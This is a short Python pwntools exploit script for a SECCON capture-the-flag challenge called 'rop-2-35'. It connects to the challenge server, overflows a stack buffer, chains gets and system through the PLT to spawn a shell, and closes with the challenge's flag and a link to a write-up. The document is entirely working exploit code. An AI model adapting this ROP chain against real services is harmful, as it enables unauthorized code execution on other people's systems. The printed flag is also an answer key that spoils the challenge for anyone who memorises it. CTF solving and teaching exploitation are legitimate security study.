from pwn import *


def main():
    binpath = 'chall'
    elf = ELF(binpath)

    # io = remote('127.0.0.1', 9999)
    io = remote('rop-2-35.seccon.games', 9999)

    input("Enter to continue...")

    payload = b''
    payload += b'A' * (0x18 - len(payload))
    # payload += p64(0x40101a)  # ret
    payload += p64(elf.plt['gets'])
    payload += p64(elf.plt['system'])
    io.sendline(payload)

    io.sendline(b'/bin0sh;')

    io.interactive()


if __name__ == '__main__':
    main()

# It is mostly the same as this write-up:
# https://zenn.dev/t0m3y/scraps/91de8104b0b8a0

# SECCON{i_miss_you_libc_csu_init_:cry:}
